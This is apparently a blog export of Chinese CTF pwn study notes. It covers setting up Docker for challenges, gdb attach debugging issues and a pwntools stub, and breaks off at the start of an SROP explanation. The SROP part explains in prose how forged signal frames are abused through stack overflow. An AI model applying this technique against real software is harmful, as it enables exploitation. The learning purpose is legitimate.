class=\"number\">#f84f57</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-builtin</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#eca622</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-atom</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#F78C6C</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-number</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#ad7a83</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-def</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#82AAFF</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-string</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#70be26</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-string-2</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#7a232e</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-comment</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#3a4677</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-variable</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#bb584b</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-tag</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#b44457</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-meta</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#b9b717</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-attribute</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#71498a</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-property</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#a075be</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-qualifier</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#f8ce11</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-variable-3</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-type</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fce470</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-error</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">rgba</span>(<span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">1.0</span>);</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"number\">#FF5370</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-matchingbracket</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">text-decoration</span>: underline;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: white <span class=\"meta\">!important</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","categories":["MESS"],"tags":["mess"]},{"title":"基于ctf pwn环境的docker搭建","url":"/2021/10/31/%E5%9F%BA%E4%BA%8Ectf%20pwn%E7%8E%AF%E5%A2%83%E7%9A%84docker%E9%85%8D%E7%BD%AE/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-rXOzeUcE\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n\n\n<p>​    最近为了校内的萌新赛，需要出一些简单的pwn题，然后把它们搓进docker。虽然步骤并不是非常复杂，而且有现成的框架，但我发现如果纯粹按照网上框架的一件脚本运行的话，遇到报错根本无法解决，所以看图说话之外我还需要较为系统地学习docker知识。</p>\n<h2 id=\"docker基础架构\"><a href=\"#docker基础架构\" class=\"headerlink\" title=\"docker基础架构\"></a>docker基础架构</h2><p>​    对于docker，在了解基础命令之前我们需要了解的就是，容器以及虚拟化的大致概念。</p>\n<h3 id=\"1-1-为什么要有docker？\"><a href=\"#1-1-为什么要有docker？\" class=\"headerlink\" title=\"1.1    为什么要有docker？\"></a>1.1    为什么要有docker？</h3><p>​    一个程序运行也许需要严苛的环境条件，也许一个微小的环境变量的差异，将导致程序的崩溃，因此在软件开发的过程中，统一环境是一件很重要的事。</p>\n<p>​    为了解决这个问题，我们可以使用虚拟机，将程序同操作系统一起打包，这样确实避免了因为环境问题导致的程序的bug。</p>\n<p>​    但是虚拟机通常体积庞大，且启动时间缓慢，资源占用多。所以相比于纯粹使用虚拟机，我们希望使用一些更轻盈的虚拟化工具来解决问题。而容器化技术应运而生，也就是Linux 容器（Linux Containers）。</p>\n<p>​    linux容器并不是完整的操作系统，容器化对进程隔离，使得不同的容器共享内核，但是调用的各种资源是虚拟的。容器化就像在正常的进程外伪装了一层外壳，使得壳内的进程认为自己是在一个全新的环境中运行，所以很自然的，容器中的应用启动速度快，资源占用少，并且体积轻巧。</p>\n<p>​    而Docker的存在为我们提供了Linux容器的封装,提供简单易用的容器使用接口。它是目前最流行的 Linux 容器解决方案。</p>\n<h3 id=\"1-2-docker基础知识\"><a href=\"#1-2-docker基础知识\" class=\"headerlink\" title=\"1.2 docker基础知识\"></a>1.2 docker基础知识</h3><p>​    之前说到，Docker提供了Linux容器的封装，运用Docker实现容器化也十分简单，我们只需要有image文件，再通过docker创建镜像的容器，就能够在容器中运行我们想要的程序。</p>\n<p>​    image文件，顾名思义，类似系统iso，它包含应用程序以及运行它所必需的依赖，Docker通过image文件生成一个个运行的容器。实际开发中，一个 image 文件往往通过继承另一个 image 文件，加上一些个性化设置而生成。举例来说，你可以在 Ubuntu 的 image 基础上，往里面加入 Apache 服务器，形成你的 image。</p>\n<h3 id=\"1-3-docker基础命令\"><a href=\"#1-3-docker基础命令\" class=\"headerlink\" title=\"1.3 docker基础命令\"></a>1.3 docker基础命令</h3><p>​    首先我们需要拉取镜像至本地，可以通过<code>docker pull</code>命令。例如：</p>\n<blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ docker image pull library/hello-world</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p>​    </p>\n<p>​        拉取镜像需要一定时间的等待，拉取完成后，通过<code>docker image ls</code>可以查看本地的docker镜像。</p>\n<p>​    <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%8811.54.51.png\" alt=\"截屏2021-11-01 下午11.54.51\"></p>\n<p>​    这个<code>hello world</code>其实就是被打包好的在特定环境下的程序，我们可以通过<code>docker cantainer run hello-world</code>指令将镜像创建为容器并运行。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%8811.59.12.png\" alt=\"截屏2021-11-01 下午11.59.12\"></p>\n<h4 id=\"docker-build\"><a href=\"#docker-build\" class=\"headerlink\" title=\"docker build\"></a>docker build</h4><p>​    build指令使用dockerfile来创建新的容器。一般来说简单的构建命令就是</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ docker build -t imagename .</span><br></pre></td></tr></table></figure>\n\n<p>​    虽然我不是很理解这个<code>-t</code>    的参数意义何在，并且镜像名后面的“.”是干啥的。</p>\n<h4 id=\"docker-run\"><a href=\"#docker-run\" class=\"headerlink\" title=\"docker run\"></a>docker run</h4><p>​    创建一个新的容器并运行</p>\n<p>​    一般来说会有这几个参数</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">-d: 后台运行容器，并返回容器ID；</span><br><span class=\"line\"></span><br><span class=\"line\">-it: 以交互模式运行容器，并创建一个伪终端；</span><br><span class=\"line\"></span><br><span class=\"line\">-p: 指定端口映射，格式为：主机(宿主)端口:容器端口</span><br><span class=\"line\"></span><br><span class=\"line\">--name=<span class=\"string\">&quot;nginx-lb&quot;</span>: 为容器指定一个名称；</span><br><span class=\"line\"></span><br><span class=\"line\">-v：映射主机文件夹至容器内\t</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"docker-start-stop-retart\"><a href=\"#docker-start-stop-retart\" class=\"headerlink\" title=\"docker start/stop/retart\"></a>docker start/stop/retart</h4><p>​    启动或停止容器。</p>\n<p>​    指令为<code>docker start/stop/retart containerID</code></p>\n<h4 id=\"docker-pause\"><a href=\"#docker-pause\" class=\"headerlink\" title=\"docker pause\"></a>docker pause</h4><p>​    暂停容器内全部进程。</p>\n<h4 id=\"docker-kill\"><a href=\"#docker-kill\" class=\"headerlink\" title=\"docker kill\"></a>docker kill</h4><p>​    kill 运行的容器进程</p>\n<h4 id=\"docker-ps\"><a href=\"#docker-ps\" class=\"headerlink\" title=\"docker ps\"></a>docker ps</h4><p>​    列出容器。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">-a :显示所有的容器，包括未运行的。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"docker-attach\"><a href=\"#docker-attach\" class=\"headerlink\" title=\"docker attach\"></a>docker attach</h4><p>​    连接到正在运行中的容器。</p>\n<p><code>docker attach containerID</code></p>\n<h4 id=\"docker-inspect\"><a href=\"#docker-inspect\" class=\"headerlink\" title=\"docker inspect\"></a>docker inspect</h4><p>​    获取容器/镜像的元数据。</p>\n<h2 id=\"简单的docker搭建步骤\"><a href=\"#简单的docker搭建步骤\" class=\"headerlink\" title=\"简单的docker搭建步骤\"></a>简单的docker搭建步骤</h2><p>​    熟悉docker基础操作后，开始搭建docker啦！！</p>\n<p>​    首先是脚本的选择，pwn的docker脚本其实很多，这里随便选一个最基础的<code>ctf_xinted</code>。</p>\n<p>​    首先我们需要做的是把项目clone到本地。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%885.11.41.png\" alt=\"截屏2021-11-01 下午5.11.41\"></p>\n<p>​    通过指令<code>cat Dockerfile</code>可以看到dockerfile。</p>\n<p>​    dockerfile是用来构建docker镜像的，里面包含了构建docker镜像构建的一些步骤和说明。一般来说如果要打包自己的环境的话，需要写dockerfile来供别人使用。这里我们直接切换到<code>ctf_xinetd</code>的文件夹下，然后执行     </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo docker build -t <span class=\"string\">&quot;helloworld&quot;</span> .</span><br></pre></td></tr></table></figure>\n\n<p>​    (注意后面的“.”)</p>\n<p>​    这个时候一般就会创建<code>helloworld</code>这个镜像，我们只需要等待创建结束，然后执行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo docker run -d -p <span class=\"string\">&quot;0.0.0.0:10001:9999&quot;</span> -h <span class=\"string\">&quot;helloworld&quot;</span> --name=<span class=\"string\">&quot;helloworld&quot;</span> helloworld</span><br></pre></td></tr></table></figure>\n\n<p>​    <code>0.0.0.0</code>表示用户连接的ip地址，10001表示对用户开放的端口，9999指容器内部端口绑定到指定的主机端口。</p>\n<p>​    如果运行正常，此时我们是能够通过 <code>nc 0.0.0.0 10001</code>来连接我们的docker容器的。</p>\n<p>​    但是有时候docker会出现一些问题。比如说在创建镜像的时候有可能会出现软件源解释失败的问题，这时候你需要关闭你的vpn（如果有）。然后重启docker。就像这样</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo service docker restart</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​    这样这个pwn题的docker就算部署完成了，你只需要把你自己的题目放置在容器中，并修改对应的flag就行。</p>\n<p>​    但是目前来说这个框架存在一些局限性，比如说一次只能部署一道题等。</p>\n<p>​    所以我们可以更换另外一个脚本进行docker镜像的创建。</p>\n<p>​    这里我们选择<a href=\"https://github.com/giantbranch/pwn_deploy_chroot.git%EF%BC%8C%E8%BF%99%E4%B8%AA%E8%84%9A%E6%9C%AC%E3%80%82\">https://github.com/giantbranch/pwn_deploy_chroot.git，这个脚本。</a></p>\n<p>​    然后有个比较全面的教程，链接在这里：<a href=\"http://www.giantbranch.cn/2018/09/24/%E5%A6%82%E4%BD%95%E5%AE%89%E5%85%A8%E5%BF%AB%E9%80%9F%E5%9C%B0%E9%83%A8%E7%BD%B2%E5%A4%9A%E9%81%93ctf%20pwn%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/\">如何安全快速地部署多道ctf%20pwn比赛题目</a></p>\n<p>​    就是把文件放到bin文件夹，然后</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">python initialize.py</span><br><span class=\"line\">docker-compose up --build -d     <span class=\"comment\"># please run as root</span></span><br></pre></td></tr></table></figure>\n\n<p>​    这样就生成了一个总的镜像，每道题通过不同端口映射，然后分别有各自的flag。</p>\n<p>​    在完成镜像的创建后，还需要在做题平台中填写相关镜像。</p>\n<p>​    因为我们的CTFd是二次开发的，一般的CTFd的题目分类是有个dynamic docker，但是我们的平台只有一个kube类型。但是里面的东西还是八九不离十，然后对于指定题目，你需要填写你的docker image。并且指定暴露端口。</p>\n<p>​    然后我这个萌新就被狠狠地坑了，一开始费了好大劲从0学习docker（虽然不难），然后通过别人的框架部署题目，创建好镜像，照猫画虎指定ip和端口运行容器，最后打开CTFd，就直接把docker image那一空给填成自己启动容器的那串ip了，然后端口也傻傻地不知道怎么搞，然后随便乱输一通，结果狠狠地靶机notready了。</p>\n<p>​    直到下午我突然意识到哪里不对，然后去搜了一下，发现别人填的和我填的好像不太一样，找胖爷爷确认了一下，果然是要填docker hub里的镜像名哇。</p>\n<p>​    然后又狠狠地push了镜像，在CTFd填了镜像的名字，然后端口就是初始化时每个二进制文件对应的那个映射的端口，这下总算靶机ready了。并且顺利通过测试。</p>\n<p>​    好！</p>\n<p>​    </p>\n<p>​        </p>\n<p>​        </p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html\">Docker 入门教程</a></p>\n<p><a href=\"https://www.runoob.com/docker/docker-image-usage.html\">Docker 镜像使用</a></p>\n<p>​    </p>\n<p>​    </p>\n","categories":["MESS"],"tags":["mess"]},{"title":"pwntools(1)-- pwnlib.tube","url":"/2021/10/27/pwntools%EF%BC%881%EF%BC%89--pwnlib.tube/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-stzXySgZ\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h3 id=\"0-preview\"><a href=\"#0-preview\" class=\"headerlink\" title=\"0)preview\"></a>0)preview</h3><p>​    一般通过萌新一般在接触pwn的时候，一个必不可少的步骤就是下载pwntools，并且在自己人生第一个脚本上输入：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br></pre></td></tr></table></figure>\n\n<p>​    我也如此。</p>\n<p>​    在学习pwn知识快一年的今天，倘若还是对pwntools这个神一般的工具迷茫不解，那我确实还不是一个合格的pwn手。</p>\n<p>​    这个系列的目的是通过简单的源码剖析，辅以相应的例题，探究pwn题，gdb调试，以及pwntools本身的一些玄学。</p>\n<p>​    第一部分，则是一个至关重要的part–<code>pwnlib.tube</code></p>\n<h3 id=\"1-进程间通信\"><a href=\"#1-进程间通信\" class=\"headerlink\" title=\"1)进程间通信\"></a>1)进程间通信</h3><p>​    在了解<code>pwnlib.tube</code>之前，我们需要知道linux进程间通信的一些基础知识，以下所有内容均参考自《csapp》</p>\n<p>​    tbc…</p>\n<p>​    </p>\n","categories":["MESS"],"tags":["pwntools"]},{"title":"gdb附加调试的一些黑魔法","url":"/2021/10/27/gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E9%BB%91%E9%AD%94%E6%B3%95/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-qwWebfut\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h2 id=\"1）abstract\"><a href=\"#1）abstract\" class=\"headerlink\" title=\"1）abstract\"></a>1）abstract</h2><p>​    这个part主要综合了一些奇怪的调试中遇到的问题，不定期更新。</p>\n<h2 id=\"2）格式化字符串-cctf-pwn3\"><a href=\"#2）格式化字符串-cctf-pwn3\" class=\"headerlink\" title=\"2）格式化字符串-cctf-pwn3\"></a>2）格式化字符串-cctf-pwn3</h2><h3 id=\"1）pause（p）导致ERROR-Could-not-find-ELF-base\"><a href=\"#1）pause（p）导致ERROR-Could-not-find-ELF-base\" class=\"headerlink\" title=\"1）pause（p）导致ERROR: Could not find ELF base\"></a>1）pause（p）导致ERROR: Could not find ELF base</h3><h5 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h5><p>​    在开始动调这个exp的时候，发现一个很奇怪的点就是如果下的断点的模式gdb.attach(sh)，那么程序会异常退出，大概是这样：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Attaching to program: /home/rin/pwn/ctf-wiki/format/cctf-pwn3/pwn3, process 27837</span><br><span class=\"line\">Reading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/libc-2.27.so...done.</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\"><span class=\"keyword\">done</span>.</span><br><span class=\"line\">Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/ld-2.27.so...done.</span><br><span class=\"line\"><span class=\"keyword\">done</span>.</span><br><span class=\"line\">Cannot access memory at address 0xf7fad924</span><br><span class=\"line\"></span><br><span class=\"line\">warning: Unable to find dynamic linker breakpoint <span class=\"keyword\">function</span>.</span><br><span class=\"line\">GDB will be unable to debug shared library initializers</span><br><span class=\"line\">and track explicitly loaded dynamic code.</span><br><span class=\"line\">Failed to <span class=\"built_in\">read</span> a valid object file image from memory.</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\">0xf7f85b59 <span class=\"keyword\">in</span> ?? ()</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%8811.17.59.png\" alt=\"截屏2021-10-27 上午11.17.59\"></p>\n<p>​    首先需要知道这个报错的原因。</p>\n<p>​    虽然我并没有查到<code>ERROR: Could not find ELF base!</code>这个报错发生的直接trigger，但是很显然这个报错发生是因为程序进程中止，因此无法找到elf base。</p>\n<p>​    那么进程中止的原因何在？</p>\n<h5 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h5><p>​     经过大师指点，这个问题其实是因为exp错误（</p>\n<p>​    这里的问题是在断点之后，我引用了未经定义的payload，导致程序异常退出，然后这个退出反映在gdb中则是<code>elf base not found</code>。    </p>\n<h5 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h5><p>​    如果exp正确，这个报错其实并不会存在。可以反推，如果再次碰到类似的报错，十有八九是exp的问题，而并不能把一切锅推给环境。</p>\n<h2 id=\"3）-kernel-vsyscall？\"><a href=\"#3）-kernel-vsyscall？\" class=\"headerlink\" title=\"3）__kernel_vsyscall？\"></a>3）__kernel_vsyscall？</h2><h5 id=\"问题-1\"><a href=\"#问题-1\" class=\"headerlink\" title=\"问题\"></a>问题</h5><p>​    上一个问题中提到，如果我们只是输入gdb.attach()，那么程序会断在<code>__kernel_vsyscall</code>这个函数上。遇见这个函数也是不止一次了，但是从未想过要了解它，今天我决定一探究竟。</p>\n<p>​    我们期望我们的进程暂停在puts payload之前，实际上确实，在此之前，exp没几乎没有任何与远端的io交互，所以断在奇怪的地方也可以理解，那么<code>__kernel_vsyscall</code>是一个怎样的函数，为什么偏偏就断在它的身上呢？ </p>\n<h5 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h5><p>​    在stackoverflow上，我们能够看出一些端倪。</p>\n<blockquote>\n<p>​    <code>__kernel_vsyscal</code> is the method used by linux-gate.so (a part of the Linux kernel) to make a system call using the fastest available method, preferably the <code>sysenter</code> instruction. </p>\n</blockquote>\n<p>​    这其实就是个系统调用方法，回想一下在srop中的知识点，其实每个系统调用都是一个中断，然后系统切换至内核态进行工作，完成后再切换回用户态，并将结果返回至用户态。</p>\n<p>​    所以出现   <code>__kernel_vsyscal</code> 意味着此刻程序正在进行系统调用。我们同时可以注意到，当  <code>__kernel_vsyscal</code> 函数执行完成，下一个函数则是<code>read</code>函数，也符合我们程序的逻辑–一个菜单题，exp中任何一条语句的结束都将使得函数执行流回到main函数，等待我们的指令。</p>\n<p>当然要结束这个函数我们只需要gdb finish。</p>\n<p>或者直接使用gdb.attach(sh,”break xxx”)。</p>\n<p>关于系统调用我想又可以写一篇专门的博客来研究，这里就不费笔墨了，详情可见：</p>\n<h2 id=\"4）gdb附加调试下断点的几种姿势。\"><a href=\"#4）gdb附加调试下断点的几种姿势。\" class=\"headerlink\" title=\"4）gdb附加调试下断点的几种姿势。\"></a>4）gdb附加调试下断点的几种姿势。</h2><h5 id=\"1）gdb-attach-p\"><a href=\"#1）gdb-attach-p\" class=\"headerlink\" title=\"1）gdb.attach(p)\"></a>1）gdb.attach(p)</h5><h5 id=\"2）gdb-attach-p-”break-lt-func-name-gt-”\"><a href=\"#2）gdb-attach-p-”break-lt-func-name-gt-”\" class=\"headerlink\" title=\"2）gdb.attach(p,”break &lt;func name&gt;”)\"></a>2）gdb.attach(p,”break &lt;func name&gt;”)</h5><h5 id=\"3）p-gdb-debug-“elf”-”break-lt-func-name-gt-”\"><a href=\"#3）p-gdb-debug-“elf”-”break-lt-func-name-gt-”\" class=\"headerlink\" title=\"3）p = gdb.debug(“elf”,”break &lt;func name&gt;” )\"></a>3）p = gdb.debug(“elf”,”break &lt;func name&gt;” )</h5><h2 id=\"5）p-gdb-debug-“elf”-”break-lt-func-name-gt-”\"><a href=\"#5）p-gdb-debug-“elf”-”break-lt-func-name-gt-”\" class=\"headerlink\" title=\"5）p = gdb.debug(“elf”,”break &lt;func name&gt;” )\"></a>5）p = gdb.debug(“elf”,”break &lt;func name&gt;” )</h2><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.35.02.png\" alt=\"截屏2021-11-04 下午7.35.02\"></p>\n<p>​    </p>\n<h2 id=\"6）Linux-Signal\"><a href=\"#6）Linux-Signal\" class=\"headerlink\" title=\"6）Linux Signal\"></a>6）Linux Signal</h2><p>​            在调试萌新赛题目的时候总是按ctrl+c试图终给程序一个断点，然后就报错。如图</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-05%20%E4%B8%8B%E5%8D%882.46.31.png\" alt=\"截屏2021-11-05 下午2.46.31\"></p>\n<p>​        感觉也不是段错误，反正类似。感觉有必要系统地了解一下linux的信号机制。</p>\n<p>​        在CSAPP Chapter8 Section5中，我们能看到对于linux signal的详细解释。</p>\n<p>​        signal算是对程序的一种软中断。一般我们能接收到的有关信号处理都是发生在程序异常的时候。然后这里sigint就是当我们按下ctrl+c，内核就给进程发送一个sigint信号，使进程中断。</p>\n<p>​        csapp上一个表非常清晰地描述了一些信号的作用以及对应的默认行为。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-05%20%E4%B8%8B%E5%8D%883.33.06.png\" alt=\"截屏2021-11-05 下午3.33.06\"></p>\n<p>​            实际的信号不止这三十种。但是一般来说就是这些。</p>\n<h2 id=\"）参考\"><a href=\"#）参考\" class=\"headerlink\" title=\"）参考\"></a>）参考</h2><p><a href=\"https://blog.csdn.net/fjh1997/article/details/105434992\">如何做到一边使用pwntools一边使用gdb下断点到main函数前</a></p>\n","categories":["MESS"],"tags":["gdb"]},{"title":"SROP学习","url":"/2021/11/07/srop%E5%AD%A6%E4%B9%A0/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-iKtojICK\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h2 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1)前言\"></a>1)前言</h2><p>​        在看完csapp的异常控制流之后，对于信号以及系统调用有了更加深入的了解，故借此机会探明SROP，这个本身并不复杂的知识点。</p>\n<h2 id=\"2）SROP原理\"><a href=\"#2）SROP原理\" class=\"headerlink\" title=\"2）SROP原理\"></a>2）SROP原理</h2><p>​         当用户向内核发起signal时，此时系统切换为内核态，并且由内核保存进程的上下文（通常是一些寄存器状态）至用户栈，然后切换回用户态，执行信号处理程序。程序执行完毕后，再次切换成内核态，将保存的寄存器状态恢复后返回用户态。</p>\n<p>​        所以这一串来回切换中，一个缺陷就是第一次切换时上下文保存于用户栈中，所以正好我们可以通过栈溢出控制栈中的数据，而且当寄存器恢复时，内核并不会检查栈中的内容是否被篡改。</p>\n<p>​        借一张图说明一下：</p>\n<p><img 